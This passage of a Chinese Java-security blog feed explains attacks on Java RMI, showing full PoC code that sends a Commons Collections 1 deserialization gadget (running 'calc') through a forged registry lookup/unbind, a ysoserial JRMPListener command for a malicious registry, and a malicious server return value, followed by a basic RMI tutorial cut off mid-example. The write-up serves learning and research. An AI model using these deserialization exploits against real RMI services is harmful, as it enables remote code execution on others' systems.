annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用它来请求带有CC1依赖的服务器即可完成攻击</p><p>注:</p><p>rebind 的攻击也是如此，将 <code>registry.bind(&quot;test&quot;,remote);</code> 替换为 <code>rebind(&quot;test&quot;,remote);</code> 方法即可。</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><code>list()</code> 方法可以列出目标上所有绑定的对象</p><p>来看list对应的源码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710181633835.png" alt="image-20240710181633835"></p><p>因为这里没有 <code>readObject()</code>，所以无法进行反序列化</p><p>因此没有什么利用价值</p><h3 id="lookup与unbind"><a href="#lookup与unbind" class="headerlink" title="lookup与unbind"></a>lookup与unbind</h3><p>这里lookup是有反序列化入口的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710182215919.png" alt="image-20240710182215919"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure><p>但在客户端这边我们只能传入字符串, 该怎么传入恶意类呢?</p><p>实际上我们可以通过反射直接修改lookup中用到的对象为恶意对象,并反射执行(简单说就是伪造一个lookup), 这样就可以绕过这一限制, 至于服务端的强制类型转换, 并不影响反序列化的执行</p><p>可以根据<code>RegistryImpl_Stub</code>这个类中的lookup方法来构造, 由于这个类是反编译过来的, 看起来还是比较麻烦, 先看最终的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 伪造lookup的代码，去伪造传输信息</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看原本的lookup, 逐步分析我们自己的lookup是如何伪造的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214158257.png" alt="image-20240710214158257"></p><p>首先是90行的newCall的调用, 我们必须得先获取到这个ref属性</p><p>我们根据继承关系找到这个ref定义的位置, 也就是RegistryImpl_Stub的父类的父类RemoteObject</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710214603105.png" alt="image-20240710214603105"></p><p>因此我们就可以这样来反射获取它</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();</span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>在newCall方法中有一个operations参数, 也需要反射获取, 这个值就在RegistryImpl_Stub中, 是一个私有常量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields_1 = registry.getClass().getDeclaredFields();</span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry);</span><br></pre></td></tr></table></figure><p>接下来照着lookup中的形式编写代码即可, 但在写入数据时, 我们写入恶意对象remote</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br></pre></td></tr></table></figure><p>这里的ref.invoke就意味着进行网络传输了</p><p>对于unbind也是类似的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240710215616245.png" alt="image-20240710215616245"></p><p>稍微修改一下即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">4</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ref.invoke(var2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h3><p>在进行bind unbind rebind list lookup这些操作时, 除了unbind rebind, 客户端都是会接收服务端返回的数据并进行反序列化的, 只要我们伪造一个注册中心, 返回恶意数据, 就能对客户端发起攻击</p><p>利用脚本太长, 直接用ysoserial现成的exp来验证了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240711143215299.png" alt="image-20240711143215299"></p><p>注意要用低版本的java, 我环境变量里是java18是运行不了的, 这里直接换到java1.8的目录里去执行</p><h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p> 这里也比较好理解, 客户端调用远程方法, 服务端返回结果, 这个结果可以是一个对象, 客户端接收这个对象, 这过程服务端序列化对象, 客户端反序列化对象, 使得客户端易受攻击</p><p> 重写服务器上的远程方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;CC1&quot;</span>);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> CC1();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">iHello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) iHello.sayHello(<span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是服务器返回恶意对象</p><p>另一种是加载远程对象</p><p>当服务器返回了一个客户端位置的类的对象时, 客户端可以指定一个URL，此时会通过URL来实例化对象。</p><p>这个利用条件相当苛刻</p><p>只有如下条件的服务器才能被攻击：</p><ol><li>设置了java.rmi.server.useCodebaseOnly&#x3D;false，或者java版本低于7u21、6u45（低于这几个版本默认为false）</li><li>设置<code>System.*setSecurityManager*(new RMISecurityManager());</code></li></ol><h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h3><p>客户端和服务端传输对象都是序列化反序列化进行的, 因此可以互相打</p><p>对于服务端, 它需要有一个受攻击的方法, 接收一个对象作为参数, 这样在客户端传入恶意对象后, 服务端将其反序列化从而受到攻击</p><p>比较简单不做演示</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;客户端攻击注册中心&quot;&gt;&lt;a href=&quot;#客户端攻击注册中心&quot; class=&quot;headerlink&quot; title=&quot;客户端攻击注册中心&quot;&gt;&lt;/a&gt;客户端攻击注册中心&lt;/h2&gt;&lt;p&gt;客户端请求注册中心有 list, bind, rebind, unbind, loo</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI</title>
    <link href="http://example.com/2024/06/06/Java-RMI/"/>
    <id>http://example.com/2024/06/06/Java-RMI/</id>
    <published>2024-06-06T01:55:14.000Z</published>
    <updated>2024-07-10T05:50:30.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-RMI"><a href="#Java-RMI" class="headerlink" title="Java RMI"></a>Java RMI</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://goodapple.top/archives/321">https://goodapple.top/archives/321</a></p><p><a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/</a></p><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><h2 id="RMI的几个重要部分"><a href="#RMI的几个重要部分" class="headerlink" title="RMI的几个重要部分"></a>RMI的几个重要部分</h2><ul><li>Client-客户端：客户端调用服务端的方法</li><li>Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果</li><li>Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用（在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功）</li></ul><h3 id="远程对象调用"><a href="#远程对象调用" class="headerlink" title="远程对象调用"></a>远程对象调用</h3><blockquote><p>在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub（存根），Stub相当于远程对象的引用或者代理。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节。而位于服务器端的Skeleton（骨架）,能够读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值。所以RMI远程调用逻辑大致是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/%E5%9B%BE%E7%89%87-80.png" alt="图片-80"></p><h2 id="测试RMI"><a href="#测试RMI" class="headerlink" title="测试RMI"></a>测试RMI</h2><p>我创建了两个项目, 用于测试服务端和客户端</p><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>IHello.java 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIServer.java</p><ul><li><p>实现 <code>IHello</code> 远程接口, 实现<code>Registry</code></p></li><li><p>继承 <code>UnicastRemoteObject</code> 类，用于生成 Stub（存根）和 Skeleton（骨架）。</p></li><li><p>实现类中使用的对象必须都可序列化，即都继承<code>java.io.Serializable</code></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IHello</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RMIHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br><span class="line">        System.out.println(<span class="string">&quot;Registry运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().register();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里bind有两种写法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIHello</span> <span class="variable">rmiHello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIHello</span>();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rmiHello);</span><br></pre></td></tr></table></figure><p>区别是一个需要加<code>rmi://0.0.0.0:1099/</code>一个不需要</p><p>我后面图片中可能有的地方书写有误, 不过bind的地方流程比较简单, 不影响分析</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需从从注册器中获取远程对象，然后调用方法即可。</p><p>当然客户端还需要一个远程对象的接口，不然不知道获取回来的对象是什么类型的。</p><p>IHello.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IHello</span> <span class="variable">ihello</span> <span class="operator">=</span> (IHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(ihello.sayHello(<span class="string">&quot;hello, n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client成功调用了Server的对象和方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240606144439733.png" alt="image-20240606144439733"></p><h2 id="JRMP协议分析"><a href="#JRMP协议分析" class="headerlink" title="JRMP协议分析"></a>JRMP协议分析</h2><p>我们将CLi端打包放进虚拟机中运行, 抓包分析rmi过程产生的流量,注意改一下ip</p><p>为cli项目添加入口类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span 